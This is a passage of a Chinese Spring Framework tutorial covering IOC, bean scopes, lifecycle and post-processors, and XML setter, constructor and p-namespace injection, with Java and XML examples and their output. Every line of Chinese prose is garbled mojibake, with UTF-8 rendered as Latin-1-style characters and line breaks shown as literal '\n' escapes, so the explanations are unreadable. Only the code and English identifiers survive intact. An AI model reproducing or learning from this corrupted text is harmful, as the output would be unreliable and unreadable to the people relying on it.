æ§åˆ¶åè½¬(IOC)ï¼šSpring ä½¿ç”¨æ§åˆ¶åè½¬æŠ€æœ¯å®ç°äº†æ¾è€¦åˆã€‚ä¾èµ–è¢«æ³¨å…¥åˆ°å¯¹è±¡ï¼Œè€Œä¸æ˜¯åˆ›å»ºæˆ–å¯»æ‰¾ä¾èµ–å¯¹è±¡ã€‚\n\n- é¢å‘åˆ‡é¢ç¼–ç¨‹(AOP)ï¼š Spring æ”¯æŒé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ŒåŒæ—¶æŠŠåº”ç”¨çš„ä¸šåŠ¡é€»è¾‘ä¸ç³»ç»Ÿçš„æœåŠ¡åˆ†ç¦»å¼€æ¥ã€‚\n\n- å®¹å™¨ï¼šSpring åŒ…å«å¹¶ç®¡ç†åº”ç”¨ç¨‹åºå¯¹è±¡çš„é…ç½®åŠç”Ÿå‘½å‘¨æœŸã€‚\n\n- MVCæ¡†æ¶ï¼šSpring çš„ Web æ¡†æ¶æ˜¯ä¸€ä¸ªè®¾è®¡ä¼˜è‰¯çš„ Web MVC æ¡†æ¶ã€‚\n\n- äº‹åŠ¡ç®¡ç†ï¼šSpring å¯¹ä¸‹è‡³æœ¬åœ°ä¸šåŠ¡ä¸Šè‡³å…¨å±€ä¸šåŠ¡(JAT)æä¾›äº†ç»Ÿä¸€çš„äº‹åŠ¡ç®¡ç†æ¥å£ã€‚\n\n- å¼‚å¸¸å¤„ç†ï¼šSpring æä¾›ä¸€ä¸ªæ–¹ä¾¿çš„ API å°†ç‰¹å®šæŠ€æœ¯çš„å¼‚å¸¸è½¬åŒ–ä¸ºä¸€è‡´çš„ã€Uncheckedå¼‚å¸¸ã€‚\n\n### Spring æ¶æ„å›¾\n\nSpring æ€»å…±å¤§çº¦æœ‰ 20 ä¸ªæ¨¡å—ï¼Œ ç”± 1300 å¤šä¸ªä¸åŒçš„æ–‡ä»¶æ„æˆã€‚\n\n![](https://img.jwt1399.top/img/spring-overview.png)\n\n## å¿«é€Ÿå…¥é—¨\n\n### ç¯å¢ƒé…ç½®\n\n#### ä¸‹è½½ Spring JAR åŒ…\n\n- 1ã€æŸ¥çœ‹æœ€æ–°å‘å¸ƒç‰ˆæœ¬ï¼šhttps://spring.io/projects/spring-framework#learnï¼ˆå¸¦çº¢è‰²GAæ ‡ç­¾çš„ï¼‰\n\n- 2ã€ä¸‹è½½å¯¹åº”ç‰ˆæœ¬ï¼š https://repo.spring.io/release/org/springframework/spring/ \n\nä¸‹è½½å®Œæˆåè§£å‹ï¼Œè§£å‹åçš„æ–‡ä»¶ç›®å½•ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```bash\n.\nâ”œâ”€â”€ docs  #APIæ–‡æ¡£å’Œå¼€å‘è§„èŒƒ\nâ”œâ”€â”€ libs  #å¼€å‘éœ€è¦çš„JARåŒ…å’Œæºç \nâ”œâ”€â”€ license.txt\nâ”œâ”€â”€ notice.txt\nâ”œâ”€â”€ readme.txt\nâ””â”€â”€ schema #å¼€å‘æ‰€éœ€è¦çš„schemaæ–‡ä»¶\n```\n\nlibs ç›®å½•ä¸­çš„ JAR åŒ…åˆ†ä¸ºä¸‰ç±»\n\n- RELEASE.jar ç»“å°¾çš„æ˜¯ Spring æ¡†æ¶ class æ–‡ä»¶çš„ JAR åŒ…\n- RELEASE-javadoc.jar ç»“å°¾çš„æ˜¯ Spring æ¡†æ¶ API æ–‡æ¡£çš„å‹ç¼©åŒ…\n- RELEASE-sources.jar ç»“å°¾çš„æ˜¯ Spring æ¡†æ¶æºæ–‡ä»¶çš„å‹ç¼©åŒ…\n\næ•´ä¸ª Spring æ¡†æ¶ç”±å¤§çº¦ 20 ä¸ªæ¨¡å—ç»„æˆï¼Œè¯¥ç›®å½•ä¸‹ Spring ä¸ºæ¯ä¸ªæ¨¡å—éƒ½æä¾›äº†è¿™ä¸‰ç±»å‹ç¼©åŒ…ã€‚\n\n#### ä¸‹è½½ç¬¬ä¸‰æ–¹ä¾èµ–åŒ…\n\nä½¿ç”¨ Spring å¼€å‘æ—¶ï¼Œé™¤äº†è¦ä½¿ç”¨è‡ªå¸¦çš„JARåŒ…å¤–ï¼ŒSpringçš„æ ¸å¿ƒå®¹å™¨è¿˜éœ€è¦ä¾èµ– **commons.logging** çš„JARåŒ…ã€‚\n\n- 1ã€ä¸‹è½½ commons-logging-1.2-bin.tar.gzï¼Œä¸‹è½½åœ°å€ï¼š[Download Apache Commons Logging](https://commons.apache.org/proper/commons-logging/download_logging.cgi)\n- 2ã€ä¸‹è½½å®Œæˆåè§£å‹ï¼Œå°† commons-logging-1.2.jar å¯¼å…¥é¡¹ç›®\n\n#### å¯¼å…¥æ ¸å¿ƒJARåŒ…\n\nåœ¨ libsç›®å½•ä¸­ï¼Œæœ‰å››ä¸ª Spring çš„åŸºç¡€åŒ…ï¼Œåˆ†åˆ«å¯¹åº” Spring æ ¸å¿ƒå®¹å™¨çš„å››ä¸ªæ¨¡å—ã€‚      \n\n- spring-core-5.x.x.RELEASE.jar\n- spring-beans-5.x.x.RELEASE.jar\n- spring-context-5.x.x.RELEASE.jar\n- spring-expression-5.x.x.RELEASE.jar\n\nåˆå­¦è€…å­¦ä¹  Sping æ¡†æ¶æ—¶ï¼Œåªéœ€å°† **Sping çš„ 4 ä¸ªåŸºç¡€åŒ…**ä»¥åŠ **commons-logging-1.2.jar** å¤åˆ¶åˆ°é¡¹ç›®çš„ lib ç›®å½•ï¼Œå¹¶å‘å¸ƒåˆ°ç±»è·¯å¾„ä¸­å³å¯ã€‚\n\n```bash\n.\nâ”œâ”€â”€ commons-logging-1.2.jar\nâ”œâ”€â”€ spring-beans-5.3.18.jar\nâ”œâ”€â”€ spring-context-5.3.18.jar\nâ”œâ”€â”€ spring-core-5.3.18.jar\nâ””â”€â”€ spring-expression-5.3.18.jar\n```\n\n### åˆ›å»ºUserç±»\n\n```java\npublic class User {\n    public void add(){\n        System.out.println(\"add.......\");\n    }\n}\n```\n\n### åˆ›å»ºé…ç½®æ–‡ä»¶bean1.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    <!--é…ç½®Userå¯¹è±¡åˆ›å»º-->\n    <bean id=\"user\" class=\"com.jwt.User\"/>\n</beans>\n```\n\n### ç¼–å†™æµ‹è¯•ç±»BeanTest\n\n```java\npublic class BeanTest {\n    @Test\n    public void testAdd() {\n        //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n        ApplicationContext context = \n                new ClassPathXmlApplicationContext(\"bean1.xml\");\n        //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n        User user = context.getBean(\"user\", User.class);\n        System.out.println(user);\n        user.add();\n    }\n}\n/**\ncom.jwt.User@6950e31\nadd.......\n**/\n```\n\n## IOCæ¦‚å¿µ\n\n- IOC(æ§åˆ¶åè½¬)ï¼ŒæŠŠå¯¹è±¡åˆ›å»ºå’Œå¯¹è±¡ä¹‹é—´çš„è°ƒç”¨è¿‡ç¨‹ï¼Œäº¤ç»™ Spring è¿›è¡Œç®¡ç† \n- ä½¿ç”¨IOCç›®çš„ï¼šä¸ºäº†é™ä½è€¦åˆåº¦\n- IOCåº•å±‚åŸç†ï¼šxml è§£æã€å·¥å‚æ¨¡å¼ã€åå°„ \n\n- IOC æ€æƒ³åŸºäº IOC å®¹å™¨å®Œæˆï¼ŒIOC å®¹å™¨åº•å±‚å°±æ˜¯å¯¹è±¡å·¥å‚\n\n**Spring æä¾› IOC å®¹å™¨ä¸¤ç§å®ç°æ–¹å¼ï¼šï¼ˆä¸¤ä¸ªæ¥å£ï¼‰** \n\n- 1ã€BeanFactoryï¼šIOC å®¹å™¨åŸºæœ¬å®ç°ï¼Œæ˜¯ Spring å†…éƒ¨çš„ä½¿ç”¨æ¥å£ï¼Œä¸æä¾›å¼€å‘äººå‘˜è¿›è¡Œä½¿ç”¨ ï¼ŒåŠ è½½é…ç½®æ–‡ä»¶æ—¶å€™ä¸ä¼šåˆ›å»ºå¯¹è±¡ï¼Œåœ¨è·å–å¯¹è±¡ï¼ˆä½¿ç”¨ï¼‰æ‰å»åˆ›å»ºå¯¹è±¡ \n\n- 2ã€ApplicationContextï¼šBeanFactory æ¥å£çš„å­æ¥å£ï¼Œæä¾›æ›´å¤šæ›´å¼ºå¤§çš„åŠŸèƒ½ï¼Œä¸€èˆ¬ç”±å¼€å‘äººå‘˜è¿›è¡Œä½¿ç”¨ï¼ŒåŠ è½½é…ç½®æ–‡ä»¶æ—¶å€™å°±ä¼šæŠŠåœ¨é…ç½®æ–‡ä»¶å¯¹è±¡è¿›è¡Œåˆ›å»ºï¼ŒApplicationContext æ¥å£æœ‰å®ç°ç±» \n\n**ApplicationContext æ¥å£å®ç°ç±»** \n\n- FileSystemXmlApplicationContext ï¼šæ­¤å®¹å™¨ä»ä¸€ä¸ª XML æ–‡ä»¶ä¸­åŠ è½½ beans çš„å®šä¹‰ï¼Œå¿…é¡»æä¾›XML Bean é…ç½®æ–‡ä»¶çš„**å…¨è·¯å¾„å**ç»™å®ƒçš„æ„é€ å‡½æ•°ã€‚\n- ClassPathXmlApplicationContextï¼šæ­¤å®¹å™¨ä»ä¸€ä¸ª XML æ–‡ä»¶ä¸­åŠ è½½ beans çš„å®šä¹‰ï¼Œä½ éœ€è¦æ­£ç¡®è®¾ç½® classpath å®¹å™¨å°†åœ¨ classpath é‡Œæ‰¾ bean é…ç½®ã€‚\n\n## IOC**æ“ä½œ**Beanç®¡ç†\n\n### **Beanç®¡ç†æŒ‡çš„æ˜¯ä¸¤ä¸ªæ“ä½œ**\n\n- 1ã€Spring åˆ›å»ºå¯¹è±¡\n- 2ã€Spirng æ³¨å…¥å±æ€§ \n\n### **Beanç®¡ç†æ“ä½œæœ‰ä¸¤ç§æ–¹å¼**\n\n- 1ã€åŸºäº xml é…ç½®æ–‡ä»¶æ–¹å¼å®ç°\n- 2ã€åŸºäºæ³¨è§£æ–¹å¼å®ç° \n\nSpring æœ‰ä¸¤ç§ç±»å‹ Beanï¼Œä¸€ç§æ˜¯æ™®é€š Beanï¼Œå¦å¤–ä¸€ç§æ˜¯å·¥å‚ Beanï¼ˆFactoryBeanï¼‰\n\n### æ™®é€šBean\n\nåœ¨é…ç½®æ–‡ä»¶ä¸­**å®šä¹‰beanç±»å‹å°±æ˜¯è¿”å›ç±»å‹**\n\n```java\npublic class MyBean {\n}\n```\n\n```xml\n<!--æ™®é€šbean-->\n<bean id=\"myBean\" class=\"com.jwt.MyBean\"></bean>\n```\n\n```java\n@Test\npublic void testBean() {\n    ClassPathXmlApplicationContext context = \n      new ClassPathXmlApplicationContext(\"bean.xml\");\n    MyBean bean = context.getBean(\"myBean\", MyBean.class);\n    System.out.println(bean);\n}\n//com.jwt.MyBean@49c43f4e\n```\n\n### å·¥å‚Bean\n\nå·¥å‚Beanï¼šåœ¨é…ç½®æ–‡ä»¶**å®šä¹‰ bean ç±»å‹å¯ä»¥å’Œè¿”å›ç±»å‹ä¸ä¸€è‡´**\n\nç¬¬ä¸€æ­¥ï¼šåˆ›å»ºç±»ï¼Œè®©è¿™ä¸ªç±»ä½œä¸ºå·¥å‚Beanï¼Œå®ç°æ¥å£FactoryBean\n\nç¬¬äºŒæ­¥ï¼šå®ç°æ¥å£é‡Œé¢çš„æ–¹æ³•ï¼Œåœ¨å®ç°çš„æ–¹æ³•ä¸­å®šä¹‰è¿”å›çš„Beanç±»å‹\n\n```java\npublic class MyBean implements FactoryBean<Course> {\n    // å®šä¹‰è¿”å›Beanç±»å‹çš„å¯¹è±¡\n    @Override\n    public Course getObject() throws Exception {\n        Course course = new Course();\n        course.setCname(\"å·¥å‚bean\");\n        return course;\n    }\n    // å¾—åˆ°å¯¹è±¡ç±»å‹\n    @Override\n    public Class<?> getObjectType() {\n        return null;\n    }\n    // æ˜¯å¦æ˜¯å•ä¾‹æ¨¡å¼\n    @Override\n    public boolean isSingleton() {\n        return false;\n    }\n}\n```\n\n```xml\n<!--å·¥å‚bean-->\n<bean id=\"myBean\" class=\"com.jwt.MyBean\"></bean>\n```\n\n```java\n@Test\npublic void testFactoryBean() {\n    ClassPathXmlApplicationContext context = \n      new ClassPathXmlApplicationContext(\"bean.xml\");\n    Course bean = context.getBean(\"myBean\", Course.class);\n    System.out.println(bean);\n}\n\n//Course{cname='å·¥å‚bean'}\n```\n\n### Beanä½œç”¨åŸŸ\n\nåœ¨ Spring é‡Œé¢ï¼Œè®¾ç½®åˆ›å»º Bean å®ä¾‹æ˜¯å•å®ä¾‹è¿˜æ˜¯å¤šå®ä¾‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ**Bean æ˜¯å•å®ä¾‹å¯¹è±¡**\n\nè¯æ˜ï¼šåˆ›å»ºäºŒä¸ª Bean çš„å®ä¾‹å¯¹è±¡ï¼Œå®ä¾‹å¯¹è±¡çš„åœ°å€ç›¸åŒè¯´æ˜æ˜¯åŒä¸€å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ Bean æ˜¯å•ä¾‹å¯¹è±¡\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n  <property name=\"bname\" value=\"å°æ˜\"></property>\n  <property name=\"bauthor\" value=\"å°ç®€\"></property>\n</bean>\n```\n\n```java\n@Test\npublic void test() {\n  ApplicationContext context =\n    new ClassPathXmlApplicationContext (\"bean3.xml\") ;\n  Book book1 = context.getBean(\"book\" , Book.class);\n  Book book2 = context.getBean(\"book\" , Book.class);\n  System.out.println (book1);\n  System.out.println (book2);\n}\n\n/**ç›¸åŒ\ncom.jwt.ioc.Book@548ad73b\ncom.jwt.ioc.Book@548ad73b\n**/\n```\n\n**å¦‚ä½•è®¾ç½®å•å®ä¾‹è¿˜æ˜¯å¤šå®ä¾‹** \n\n- åœ¨ Spring é…ç½®æ–‡ä»¶ bean æ ‡ç­¾é‡Œé¢æœ‰å±æ€§ï¼ˆscopeï¼‰ç”¨äºè®¾ç½®å•å®ä¾‹è¿˜æ˜¯å¤šå®ä¾‹\n\n- scope å±æ€§å€¼\n  - singletonï¼Œé»˜è®¤å€¼ï¼Œè¡¨ç¤ºæ˜¯å•å®ä¾‹å¯¹è±¡ \n  - prototypeï¼Œè¡¨ç¤ºæ˜¯å¤šå®ä¾‹å¯¹è±¡ \n\n**singletonå’ŒprototypeåŒºåˆ«** \n\n- singleton è¡¨ç¤ºå•å®ä¾‹ï¼Œprototype è¡¨ç¤ºå¤šå®ä¾‹ã€‚\n\n- è®¾ç½® scope ä¸º singleton çš„æ—¶å€™ï¼Œåœ¨åŠ è½½ Spring é…ç½®æ–‡ä»¶æ—¶å€™å°±ä¼šåˆ›å»ºå•å®ä¾‹å¯¹è±¡ï¼Œ\n\n- å¦‚æœ scope ä¸º prototype çš„æ—¶å€™ï¼Œä¸æ˜¯åœ¨åŠ è½½ Spring é…ç½®æ–‡ä»¶çš„æ—¶å€™åˆ›å»ºå¯¹è±¡ï¼Œè€Œæ˜¯åœ¨è°ƒç”¨ getBean æ–¹æ³•çš„æ—¶å€™åˆ›å»ºå¤šå®ä¾‹å¯¹è±¡\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\" scope=\"prototype\">\n  <property name=\"bname\" value=\"å°æ˜\"></property>\n  <property name=\"bauthor\" value=\"å°ç®€\"></property>\n</bean>\n```\n\n```java\n@Test\npublic void test() {\n  ApplicationContext context =\n    new ClassPathXmlApplicationContext (\"bean3.xml\") ;\n  Book book1 = context.getBean(\"book\" , Book.class);\n  Book book2 = context.getBean(\"book\" , Book.class);\n  System.out.println (book1);\n  System.out.println (book2);\n}\n\n/**ä¸ç›¸åŒ\ncom.jwt.ioc.Book@eb21112\ncom.jwt.ioc.Book@2eda0940\n**/\n```\n\n### Beanç”Ÿå‘½å‘¨æœŸ\n\n**Beanç”Ÿå‘½å‘¨æœŸï¼šä»å¯¹è±¡åˆ›å»ºåˆ°å¯¹è±¡é”€æ¯çš„è¿‡ç¨‹**\n\n- 1ã€é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰\n- 2ã€ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨setæ–¹æ³•ï¼‰\n- 3ã€è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰\n- 4ã€bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰\n- 5ã€å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰\n\n**æ¼”ç¤ºBeanç”Ÿå‘½å‘¨æœŸ** \n\n```java\npublic class Orders {\n    private String oname;\n    public Orders() {\n        System.out.println(\"ç¬¬ä¸€æ­¥ æ‰§è¡Œæ— å‚æ„é€ å™¨åˆ›å»ºbeanå®ä¾‹\");\n    }\n    public void setOname(String oname) {\n        System.out.println(\"ç¬¬äºŒæ­¥ è°ƒç”¨setæ–¹æ³•è®¾ç½®å±æ€§å€¼\");\n        this.oname = oname;\n    }\n    // åˆ›å»ºæ‰§è¡Œçš„åˆå§‹åŒ–æ–¹æ³•\n    public void initMethod() {\n        System.out.println(\"ç¬¬ä¸‰æ­¥ æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•\");\n    }\n    // åˆ›å»ºæ‰§è¡Œçš„é”€æ¯æ–¹æ³•\n    public void destroyMethod(){\n        System.out.println(\"ç¬¬äº”æ­¥ æ‰§è¡Œé”€æ¯æ–¹æ³•\");\n    }\n}\n```\n\n```xml\n<!--beanå£°æ˜å‘¨æœŸ-->\n<bean id=\"orders\" class=\"com.jwt.ioc.Orders\" init-method=\"initMethod\" destroy-method=\"destroyMethod\">\n  <property name=\"oname\" value=\"ç”µè„‘\"/>\n</bean>\n```\n\n```java\n@Test\npublic void testBeanLive() {\n  ClassPathXmlApplicationContext context =\n    new ClassPathXmlApplicationContext(\"bean5.xml\");\n  Orders bean = context.getBean(\"orders\", Orders.class);\n  System.out.println(\"ç¬¬å››æ­¥ è·å–åˆ›å»ºbeanå®ä¾‹çš„å¯¹è±¡\"+bean);\n  context.close();// æ‰‹åŠ¨è®©beané”€æ¯\n}\n/**\nç¬¬ä¸€æ­¥ æ‰§è¡Œæ— å‚æ„é€ å™¨åˆ›å»ºbeanå®ä¾‹\nç¬¬äºŒæ­¥ è°ƒç”¨setæ–¹æ³•è®¾ç½®å±æ€§å€¼\nç¬¬ä¸‰æ­¥ æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•\nç¬¬å››æ­¥ è·å–åˆ›å»ºbeanå®ä¾‹çš„å¯¹è±¡com.jwt.ioc.Orders@954b04f\nç¬¬äº”æ­¥ æ‰§è¡Œé”€æ¯æ–¹æ³•\n**/\n```\n\n**å¦‚æœæœ‰beanåç½®å¤„ç†å™¨ï¼Œåˆ™beançš„ç”Ÿå‘½å‘¨æœŸæœ‰ä¸ƒç§**\n\n- 1ã€é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰\n\n- 2ã€ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨ set æ–¹æ³•ï¼‰\n\n- **3**ã€æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessBeforeInitialization\n\n- 4ã€è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰\n\n- **5**ã€æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessAfterInitialization\n\n- 6ã€bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰\n\n- 7ã€å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰\n\né…ç½®åç½®å¤„ç†å™¨ï¼Œå®ç° BeanPostProcessor æ¥å£\n\n```java\npublic class MyBeanPost implements BeanPostProcessor {\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        System.out.println(\"åœ¨åˆå§‹åŒ–ä¹‹å‰æ‰§è¡Œçš„æ–¹æ³•\");\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException {\n        System.out.println(\"åœ¨åˆå§‹åŒ–ä¹‹åæ‰§è¡Œçš„æ–¹æ³•\");\n        return bean;\n    }\n}\n```\n\n```xml\n<!--é…ç½®åç½®å¤„ç†å™¨ é…ç½®ä¹‹åä¼šä¸ºæ‰€æœ‰çš„beanå®ä¾‹æ·»åŠ åç½®å¤„ç†å™¨-->\n<bean id=\"myBeanPost\" class=\"com.jwt.ioc.MyBeanPost\"></bean>\n```\n\n```java\n@Test\npublic void testBeanLive() {\n  ClassPathXmlApplicationContext context =\n    new ClassPathXmlApplicationContext(\"bean5.xml\");\n  Orders bean = context.getBean(\"orders\", Orders.class);\n  System.out.println(\"ç¬¬å››æ­¥ è·å–åˆ›å»ºbeanå®ä¾‹çš„å¯¹è±¡\"+bean);\n  context.close();// æ‰‹åŠ¨è®©beané”€æ¯\n}\n\n/**\nç¬¬ä¸€æ­¥ æ‰§è¡Œæ— å‚æ„é€ å™¨åˆ›å»ºbeanå®ä¾‹\nç¬¬äºŒæ­¥ è°ƒç”¨setæ–¹æ³•è®¾ç½®å±æ€§å€¼\nåœ¨åˆå§‹åŒ–ä¹‹å‰æ‰§è¡Œçš„æ–¹æ³•\nç¬¬ä¸‰æ­¥ æ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•\nåœ¨åˆå§‹åŒ–ä¹‹åæ‰§è¡Œçš„æ–¹æ³•\nç¬¬å››æ­¥ è·å–åˆ›å»ºbeanå®ä¾‹çš„å¯¹è±¡com.jwt.ioc.Orders@481a15ff\nç¬¬äº”æ­¥ æ‰§è¡Œé”€æ¯æ–¹æ³•\n**/\n```\n\n## åŸºäºxmlæ–¹å¼\n\n### åŸºäºxmlåˆ›å»ºå¯¹è±¡\n\n1ã€åœ¨springé…ç½®æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ bean æ ‡ç­¾ï¼Œæ ‡ç­¾é‡Œé¢æ·»åŠ å¯¹åº”å±æ€§ï¼Œå°±å¯ä»¥å®ç°å¯¹è±¡åˆ›å»º\n\n2ã€åœ¨beanæ ‡ç­¾æœ‰å¾ˆå¤šå±æ€§ï¼Œå¸¸ç”¨çš„å±æ€§ï¼š\n\n* idå±æ€§ï¼šå”¯ä¸€æ ‡è¯† \n* classå±æ€§ï¼šç±»å…¨è·¯å¾„ï¼ˆåŒ…ç±»è·¯å¾„ï¼‰ \n\n3ã€åˆ›å»ºå¯¹è±¡æ—¶å€™ï¼Œé»˜è®¤ä¹Ÿæ˜¯æ‰§è¡Œæ— å‚æ•°æ„é€ æ–¹æ³•å®Œæˆå¯¹è±¡åˆ›å»º \n\n```xml\n<!--é…ç½®Userå¯¹è±¡åˆ›å»º-->\n<bean id=\"user\" class=\"com.jwt.User\"></bean>\n```\n\n### åŸºäºxmlæ³¨å…¥å±æ€§\n\n> åŸºäº xml æ³¨å…¥å±æ€§å°±æ˜¯ä¾èµ–æ³¨å…¥(DI)\n\n#### 1ã€ä½¿ç”¨setæ–¹æ³•è¿›è¡Œæ³¨å…¥\n\nStep1ï¼šåˆ›å»ºç±»ï¼Œå®šä¹‰å±æ€§å’Œå¯¹åº”çš„setæ–¹æ³•\n\n```java\npublic class Book {\n    //åˆ›å»ºå±æ€§\n    private String bname;\n    private String bauthor;\n\n    //åˆ›å»ºå±æ€§å¯¹åº”çš„setæ–¹æ³•\n    public void setBname(String bname) {\n        this.bname = bname;\n    }\n    public void setBauthor(String bauthor) {\n        this.bauthor = bauthor;\n    }\n\n    @Override\n    public String toString() {\n        return \"Book{\" +\n                \"bname='\" + bname + '\\'' +\n                \", bauthor='\" + bauthor + '\\'' +\n                '}';\n    }\n}\n```\n\nStep2ï¼šé…ç½®xmlæ–‡ä»¶åˆ›å»ºå¯¹è±¡ï¼Œç”¨ property æ ‡ç­¾æ³¨å…¥å±æ€§\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n  <!--ä½¿ç”¨propertyå®Œæˆå±æ€§æ³¨å…¥\n \t\t\tnameï¼šç±»é‡Œé¢å±æ€§åç§° \n\t\t\tvalueï¼šå‘å±æ€§æ³¨å…¥çš„å€¼ -->\n  <property name=\"bname\" value=\"Javaå…¥é—¨åˆ°ç²¾é€š\"></property>\n  <property name=\"bauthor\" value=\"å°ç®€\"></property>\n</bean>\n```\n\nStep3ï¼šæµ‹è¯•\n\n```java\npublic class BookTest {\n    @Test\n    public void test(){\n        //1 åŠ è½½ spring é…ç½®æ–‡ä»¶\n        ClassPathXmlApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        //2 è·å–é…ç½®åˆ›å»ºçš„å¯¹è±¡\n        Book book = context.getBean(\"book\", Book.class);\n        System.out.println(book);\n    }\n}\n\n//Book{bname='Javaå…¥é—¨åˆ°ç²¾é€š', bauthor='å°ç®€'}\n```\n\n#### 2ã€ä½¿ç”¨æœ‰å‚æ•°æ„é€ è¿›è¡Œæ³¨å…¥\n\nStep1ï¼šåˆ›å»ºç±»ï¼Œå®šä¹‰å±æ€§ï¼Œåˆ›å»ºå±æ€§å¯¹åº”æœ‰å‚æ•°æ„é€ æ–¹æ³• \n\n```java\npublic class Order {\n    private String oname;\n    private String address;\n\n    public Order(String oname, String address) {\n        this.oname = oname;\n        this.address = address;\n    }\n\n    @Override\n    public String toString() {\n        return \"Order{\" +\n                \"oname='\" + oname + '\\'' +\n                \", address='\" + address + '\\'' +\n                '}';\n    }\n}\n```\n\nStep2ï¼šé…ç½®xmlæ–‡ä»¶åˆ›å»ºå¯¹è±¡\n\n```xml\n<bean id=\"order\" class=\"com.jwt.ioc.Order\">\n    <!--é€šè¿‡å±æ€§åç§°æ³¨å…¥-->\n    <constructor-arg name=\"oname\" value=\"ç”µè„‘\"></constructor-arg>\n    <constructor-arg name=\"address\" value=\"China\"></constructor-arg>\n    <!--é€šè¿‡ç´¢å¼•åç§°æ³¨å…¥-->\n    <!--<constructor-arg index=\"0\" value=\"å¹³æ¿\"></constructor-arg>-->\n    <!--<constructor-arg index=\"1\" value=\"china\"></constructor-arg>-->\n</bean>\n```\n\nStep3ï¼šæµ‹è¯•\n\n```java\npublic class OrderTest {\n    @Test\n    public void test(){\n        ClassPathXmlApplicationContext context =\n                new ClassPathXmlApplicationContext(\"bean2.xml\");\n        Order order = context.getBean(\"order\", Order.class);\n        System.out.println(order);\n    }\n}\n\n//Order{oname='ç”µè„‘', address='China'}\n```\n\n### påç§°ç©ºé—´æ³¨å…¥\n\n> ä½¿ç”¨påç§°ç©ºé—´æ³¨å…¥ï¼Œå¯ä»¥ç®€åŒ–åŸºäº xml é…ç½®æ–¹å¼\n\nStep1ï¼šæ·»åŠ påç§°ç©ºé—´åˆ°é…ç½®æ–‡ä»¶ä¸­`xmlns:p=\"http://www.springframework.org/schema/p\"`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xmlns:p=\"http://www.springframework.org/schema/p\" \n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n</beans>\n```\n\nStep2ï¼šé€šè¿‡pæ ‡ç­¾è¿›è¡Œå±æ€§æ³¨å…¥\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\" p:bname=\"Springå…¥é—¨\" p:bauthor=\"æ— åæ°\"></bean>\n```\n\n### æ³¨å…¥ç©ºå€¼å’Œç‰¹æ®Šç¬¦å·\n\nè®¾ç½®ç©ºå€¼ï¼šåœ¨å±æ€§propertyé‡Œä½¿ç”¨nullæ ‡ç­¾å®ç°\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n    <property name=\"bname\" value=\"Springå­¦ä¹ \"/>\n    <!--è®¾ç½®nullå€¼-->\n    <property name=\"bauthor\">\n        <null></null>\n    </property>\n</bean>\n\n<!--Book{bname='Springå­¦ä¹ ', bauthor='null'}-->\n```\n\nè®¾ç½®ç‰¹æ®Šç¬¦å·ï¼šåœ¨å±æ€§propertyé‡Œä½¿ç”¨ **value æ ‡ç­¾**é€šè¿‡ **\\<![CDATA[xxx]]>** å®ç°\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n    <property name=\"bname\" value=\"Springå­¦ä¹ \"/>\n    <property name=\"bauthor\">\n      \t<value><![CDATA[<<è¥¿æ¸¸è®°>>]]></value>\n    